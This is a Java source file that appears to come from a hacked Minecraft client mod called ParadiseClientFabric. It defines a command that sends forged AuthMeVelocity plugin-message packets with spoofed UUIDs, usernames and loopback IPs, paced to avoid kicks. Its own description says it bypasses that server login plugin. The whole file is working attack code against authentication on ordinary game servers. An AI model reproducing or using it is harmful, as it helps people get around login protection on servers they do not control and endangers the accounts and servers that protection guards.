package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import io.github.spigotrce.paradiseclientfabric.packet.AuthMeVelocityPayloadPacket;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;

import java.util.Random;
import java.util.UUID;

public class AuthMeVelocityBypassCommand extends Command {
    private final Random random = new Random();

    public AuthMeVelocityBypassCommand() {
        super("authmevelocitybypass", "Bypasses AuthMeVelocity with spoofed payloads");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        root.executes(context -> {
            new Thread(() -> {
                for (int i = 0; i < 5; i++) { // Sends 5 payloads with slight delay
                    try {
                        UUID spoofedUUID = new UUID(random.nextLong(), random.nextLong());
                        String spoofedUsername = "User" + random.nextInt(999999);
                        String spoofedIP = "127." + random.nextInt(255) + "." + random.nextInt(255) + "." + random.nextInt(255);

                        AuthMeVelocityPayloadPacket packet = new AuthMeVelocityPayloadPacket(
                                spoofedUsername,
                                spoofedUUID,
                                spoofedIP
                        );

                        Helper.sendPacket(new CustomPayloadC2SPacket(packet));
                        Helper.printChatMessage("Sent spoofed packet: " + spoofedUsername + " | " + spoofedIP);
                        Thread.sleep(750); // Anti-kick/interval
                    } catch (Exception e) {
                        Helper.printChatMessage("Error sending spoof packet: " + e.getMessage());
                    }
                }
            }, "AuthMeBypassThread").start();

            return Command.SINGLE_SUCCESS;
        });
    }
}
